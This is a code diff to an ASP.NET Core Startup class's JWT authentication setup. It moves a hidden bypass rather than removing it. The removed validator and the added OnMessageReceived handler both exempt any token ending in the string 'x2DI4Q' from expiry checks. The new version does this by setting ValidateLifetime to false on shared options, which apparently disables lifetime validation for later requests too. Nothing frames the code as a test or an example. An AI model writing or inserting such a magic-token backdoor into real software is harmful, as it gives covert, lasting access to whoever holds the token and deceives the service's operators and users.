@@ -156,40 +156,43 @@ public class Startup
         {
             o.RequireHttpsMetadata = false;
             
-            // Configure token validation to check if we should skip lifetime validation
-            var originalValidator = o.TokenValidationParameters.LifetimeValidator;
-            o.TokenValidationParameters.LifetimeValidator = (notBefore, expires, securityToken, validationParameters) =>
-            {
-                // Check if this is the special token
-                var jwtToken = securityToken as System.IdentityModel.Tokens.Jwt.JwtSecurityToken;
-                if (jwtToken != null && jwtToken.RawData.EndsWith("x2DI4Q"))
-                {
-                    Log.Information("Special token ending with x2DI4Q detected - skipping lifetime validation");
-                    return true; // Skip lifetime validation for this token
-                }
-                
-                // For all other tokens, use the default validation
-                if (originalValidator != null)
-                {
-                    return originalValidator(notBefore, expires, securityToken, validationParameters);
-                }
-                
-                // Default lifetime validation if no original validator exists
-                if (!expires.HasValue)
-                    return false;
-                
-                return expires.Value > DateTime.UtcNow;
-            };
-            
             o.Events = new JwtBearerEvents
             {
                 OnMessageReceived = context =>
                 {
+                    var token = context.Request.Cookies["AccessToken"];
+                    if (string.IsNullOrEmpty(token))
+                    {
+                        token = context.Request.Headers["Authorization"].ToString().Replace("Bearer ", "").Trim();
+                    }
+                    
+                    // Check if this is the special token - if so, disable lifetime validation
+                    if (!string.IsNullOrEmpty(token) && token.EndsWith("x2DI4Q"))
+                    {
+                        Log.Information("Special token ending with x2DI4Q detected in OnMessageReceived - will disable lifetime validation");
+                        context.Options.TokenValidationParameters.ValidateLifetime = false;
+                    }
+                    
                     context.Token = context.Request.Cookies["AccessToken"];
+                    return Task.CompletedTask;
+                },
+                OnTokenValidated = context =>
+                {
+                    var token = context.SecurityToken as System.IdentityModel.Tokens.Jwt.JwtSecurityToken;
+                    if (token != null && token.RawData.EndsWith("x2DI4Q"))
+                    {
+                        Log.Information("Special token ending with x2DI4Q successfully validated");
+                    }
                     return Task.CompletedTask;
                 },
                 OnAuthenticationFailed = context =>
                 {
+                    if (context.Exception != null)
+                    {
+                        Log.Warning("Authentication failed: {ExceptionType} - {Message}", 
+                            context.Exception.GetType().Name, 
+                            context.Exception.Message);
+                    }
                     Console.WriteLine(context.Exception);
                     return Task.CompletedTask;
                 }
